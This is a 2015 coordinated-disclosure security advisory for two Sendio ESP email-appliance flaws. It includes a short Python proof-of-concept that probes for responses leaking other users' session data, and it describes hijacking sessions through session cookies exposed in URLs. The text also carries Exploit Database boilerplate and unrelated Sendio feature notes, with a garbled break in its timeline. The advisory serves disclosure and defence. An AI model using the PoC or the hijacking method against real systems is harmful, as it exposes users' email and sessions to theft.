1. Advisory Information

Title: Sendio ESP Information Disclosure Vulnerability
Advisory ID: CORE-2015-0010
Advisory URL: <http://www.coresecurity.com/advisories/sendio-esp-information-disclosure-vulnerability>
Date published: 2015-05-22
Date of last update: 2015-05-22
Vendors contacted: Sendio
Release mode: Coordinated release

2. Vulnerability Information

Class: OWASP Top Ten 2013 Category A2 - Broken Authentication and Session Management [CWE-930], Information Exposure
[CWE-200]
Impact: Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2014-0999, CVE-2014-8391

3. Vulnerability Description

Sendio [1] ESP (E-mail Security Platform) is a network appliance which provides anti-spam and anti-virus solutions for
enterprises. Two information disclosure issues were found affecting some versions of this software, and can lead to
leakage of sensitive information such as user's session identifiers and/or user's email messages.

4. Vulnerable Packages

Sendio 6 (14.1120.0)
Other products and versions might be affected too, but they were not tested.

5. Vendor Information, Solutions and Workarounds

Sendio informs us that [CVE-2014-0999] and [CVE-2014-8391] are fixed on Sendio software Version 7.2.4.

For [CVE-2014-0999], the vulnerability only exists for HTTP web sessions and not HTTPS web sessions. Sendio recommends
that customers who have not upgraded to Version 7.2.4 should disallow HTTP on their Sendio product and only use HTTPS.

6. Credits

This vulnerability was discovered and researched by Martin Gallo from Core Security's Consulting Services Team. The
publication of this advisory was coordinated by Joaquín Rodríguez Varela from Core Security's Advisories Team.

7. Technical Description / Proof of Concept Code

7.1. Disclosure of session cookie in Web interface URLs

The Sendio [1] ESP Web interface authenticates users with a session cookie named "jsessionid". The vulnerability
[CVE-2014-0999] is caused due the way the Sendio ESP Web interface handles this authentication cookie, as the
"jsessionid" cookie value is included in URLs when obtaining the content of emails. The URLs used by the application
follow this format:

http://<ESP-web-interface-domain>:<ESP-web-interface-port>/sendio/ice/cmd/msg/body;jsessionid=<session-identifier-value>?id=<message-id>

This causes the application to disclose the session identifier value, allowing attackers to perform session hijacking.
An attacker might perform this kind of attack by sending an email message containing links or embedded image HTML tags
pointing to a controlled web site, and then accessing the victim's session cookies through the "Referrer" HTTP header.
Accessing this authentication cookie might allow an attacker to hijack a victim's session and obtain access to email
messages or perform actions on behalf of the victim.

7.2. Response mixup in Web interface

The vulnerability [CVE-2014-8391] is caused by an improper handling of users' sessions by the Web interface. Under
certain conditions, this could lead to the server disclosing sensitive information that was intended for a different
user. This information includes, for instance, other users' session identifiers, email message identifiers or email
message subjects. In order to trigger this vulnerability, requests should be authenticated.

The following Python script can be used to trigger this vulnerability under certain circumstances:

import requests

domain = "target.domain.com"                     # The target domain
port = 8888                                      # The target port
jsessionid = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"  # A valid jsessionid
num = 100000                                     # No of request to make
msgid = 9999999                                  # A valid message id to baseline the requests

url = "<http://%s:%d/sendio/ice/cmd/msg/body;jsessionid=%s">; % (domain, port, jsessionid)

def make_request(id):
    params = {"id": str(id)}
    headers = {"Cookie": "JSESSIONID=%s" % jsessionid}
    return requests.get(url, params=params, headers=headers)

print "[*] Reaching the target to define baseline"
r = make_request(msgid)
baseline_length = r.headers["content-length"]
print "[*] Defined baseline: %d bytes" % baseline_length

for id in range(0, num):
    r = make_request(msgid)
    rlength = int(r.headers["content-length"])
    if r.status_code == 200 and rlength != baseline_length:
        print "\t", r.status_code, rlength, r.text
    else:
        print "\t", r.status_code, rlength

8. Report Timeline

2015-03-26: Core Security sent an initial notification to Sendio informing them that multiple vulnerabilities were
found in one of their products, and requested their PGP keys in order to start an encrypted communication.
2015-03-27: Sendio replied that they would not be able to use PGP keys, but stated that their In/out SMTP gateway uses
TLS, so that should suffice. They detailed that they were working on a fix for the "CS_SENDIO_JSESSIONID_DISCLOSURE"
vulnerability and estimated it would be released by the end of April, 2015. They requested additional technical details
for the "CS_SENDIO_INFO_LEAK" vulnerability.
2015-03-30: Core Security informed that understood that Sendio may not be able to use PGP keys, but Core doesn't
consider the use of TLS as a replacement for PGP. Core Security requested to receive confirmation from Sendio in case
they wanted to keep the communications unencrypted with PGP in order to send them a draft version of the advisory.
2015-03-30: Sendio confirmed that the communication can remain "as is" without PGP. They will inform Core once they
have a specific date for publishing the fix. Sendio requested a PoC for the "CS_SENDIO_INFO_LEAK vulnerability".
2015-03-31: Core Security sent a draft version of the advisory and PoC to Sendio.
2015-03-31: Sendio confirmed reception of the advisory and PoC and informed Core that they would provide an update on
their test on April 6.
2015-04-06: Sendio informed Core that they were able to reproduce the "CS_SENDIO_INFO_LEAK" issue and that were still
analyzing it in order to create a fix.
2015-04-07: Core Security requested an estimated date for the release of a fix/update.
2015-04-13: Core Security again requested an answer from Sendio regarding the release of a fix/update.

that was undergoing a System Test. Sendio estimated the release would take place on May 15, 2015.
2015-04-20: Sendio informed Core they were still planning to release the fixes by May 15, 2015.
2015-04-20: Core Security thanked Sendio for the update and informed them they would schedule their security advisory
accordingly.
2015-04-24: Core Security requested that Sendio delay the release date of the fixes until Monday, May 18 in order to
avoid publishing them on a Friday.
2015-04-27: Sendio informed Core that many of their customers have their Sendio systems set to "automatically update"
on weekends. Sendio requested Core publish their advisory a week after the fix is published. Sendio also requested the
ability to add some workarounds into Core's advisory.
2015-04-28: Core Security informed Sendio that they understood their update policy and let them know that it is Core's
policy to publish their advisory the same day the fix is released in order to inform the affected users of its
availability. Core also stated that they were willing to add any workarounds Sendio proposed.
2015-05-05: Sendio informed Core that they were still having problems developing a fix for the JSession vulnerability,
therefore they may have to postpone the release date from May 15 to May 22.
2015-05-07: Core Security thanked Sendio for the update and requested to be kept informed in order to have enough time
to schedule their advisory.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

 **SilverListing Spoof Protection**

* SilverListing has been extended to provide spoof detection through this new feature. By enabling SilverListing Spoof Protection if an email is received from a sender associated with an “Allow Contact” record but from a new IP address, SilverListing will be applied. Since all valid email messages from Allow Contacts come from a very small list of IP addresses the vast majority of email will be delivered immediately. For those email messages that come from an IP which has not previously passed the SilverListing test then SilverListing will be applied to confirm the message is not from a spammer.
* Enabled by default.

**Sender IP Address Bad Reputation**

* The Commtouch IP Reputation feature will allow Sendio administrators to define how Sendio should handle messages from sources with an IP reputation that indicates a 90% or higher likelihood of sending spam. Our testing has shown the 90% value is the ideal value for stopping known spammers without increasing the chance of false positives. As such this value is not configurable.
* If the Commtouch service or our Premium AV service was not purchased then the Sendio IP Address Bad Reputation feature will be grayed out and unavailable.
* Enabled by default – Action set to Hold Message.

**When No Contact Matches**

* Very basic question – how should Sendio respond when there is neither a Contact nor an Administrator Policy that applies to a message? Previously this logic was tied directly with Sender Address Verification. This new feature allows you to configure the 2 elements (Contact Checking and SAV) separately. For example now messages can be Held without generating an SAV.
* Default action set to Hold Message.

**No Contact Match for Bulk Messages**

* Sendio has always included Bulk classifications within the user interface (to get a sense for what Bulk is you can change the message view in your Sendio web interface to Pending messages, show bulk), but with the release of Sendio 6 administrators will now be able to configure how Sendio should respond when there is neither a Contact nor an Administrator Policy that applies to a Bulk message.
* Default action set to Hold Message.

**Sender Address Verification (SAV)**

* This is the same as the existing option but only applies to non-Bulk messages. Sender Address Verification will be sent to new senders.
* Enabled by default.

**Send SAV for Bulk Messages**

* For messages tagged as Bulk will Sendio generate an SAV? Research indicates that extremely few SAV generated for Bulk messages are ever replied to.
* Disabled by default.

**Send SAV Acknowledgements**

* Based on customer feedback we now allow you to configure whether Sendio will send the SAV Acknowledgement to senders that reply to the SAV.
* Enabled by default.

**24h System Sender Response Limit**

* This option defines the maximum number of automatic responses (SAV, NDR, DSN) generated by a Sendio system to a particular email address in a 24 hour period.
* Value set to 50 by default.

**24h Per User Sender Response Limit**

* This option defines the maximum number of automatic responses (SAV, NDR, DSN) from a given Sendio user to a particular email address in a 24 hour period.
* Value set to 1 by default.

**Manual Time Synchronization**

* From the SSH (PuTTY) interface > System Control section there is now a Sync Time option. Selecting this option will force Sendio to immediately synchronize the internal time with an NTP server
